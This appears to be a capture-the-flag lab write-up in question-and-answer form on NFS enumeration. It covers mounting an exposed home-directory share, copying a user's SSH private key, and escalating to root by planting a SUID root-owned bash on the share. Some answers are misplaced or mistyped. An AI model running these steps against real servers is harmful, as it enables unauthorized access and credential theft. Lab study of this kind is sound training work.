What does NFS stand for?
  Network File System
What process allows an NFS client to interact with a remote directory as though it was a physical device?
  Mounting
What does NFS use to represent files and directories on the server?
  File Handle
What protocol does NFS use to communicate between the server and client?
  rpc
What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2
  user id / group id
Can a Windows NFS server share files with a Linux client? (Y/N)

What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.
  4.2

Conduct a thorough port scan scan of your choosing, how many ports are open?
  7
Which port contains the service we're looking to enumerate?
  2049
Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?
  /hpme
Time to mount the share to our local machine!

First, use "mkdir /tmp/mount" to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart.

Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?
  └─$ sudo mount -t nfs 10.10.37.212:/home /tmp/thmmount -nolock
  
Have a look inside this directory, look at the files. Looks like  we're inside a user's home directory...

Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?

Which of these keys is most useful to us?
  .ssh
Copy this file to a different location your local machine, and change the permissions to "600" using "chmod 600 [file]".
  id_rsa
Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.

Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)

First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.

Download the bash executable to your Downloads directory. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"
  chmod +s bash
Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?
Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like? Make sure that it ends with -sr-x.
  -rwsr-sr-x
Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.

Great! If all's gone well you should have a shell as root! What's the root flag?
